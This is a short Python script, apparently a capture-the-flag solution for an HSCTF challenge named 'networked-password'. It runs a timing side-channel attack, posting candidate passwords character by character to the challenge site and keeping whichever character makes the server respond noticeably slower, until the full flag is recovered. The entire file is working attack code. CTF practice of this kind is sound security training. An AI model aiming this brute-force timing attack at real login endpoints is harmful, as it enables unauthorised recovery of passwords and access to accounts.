import requests
import string

host = "https://networked-password.web.chal.hsctf.com/"

dic = string.printable
r = requests.get(host)

flag = "hsctf{"
nowtime = 3.9 #determined by the first print time
yes = 0

while flag[-1]!= "}":
    for i in dic:
        postdata = {"password" : flag + i}
        r = requests.post(host, data=postdata, timeout = 30)
        time = r.elapsed.total_seconds()
        # print(time)
        if time > nowtime + 0.4:
            flag += i
            nowtime = time
            print('[.] Character fuzzed! Now the flag is ' + flag)
            yes = 1
            break
    if yes == 0:
        print('[x] Failed to find next character. Now the flag is ' + flag)
        break

print('===================================')
print(flag)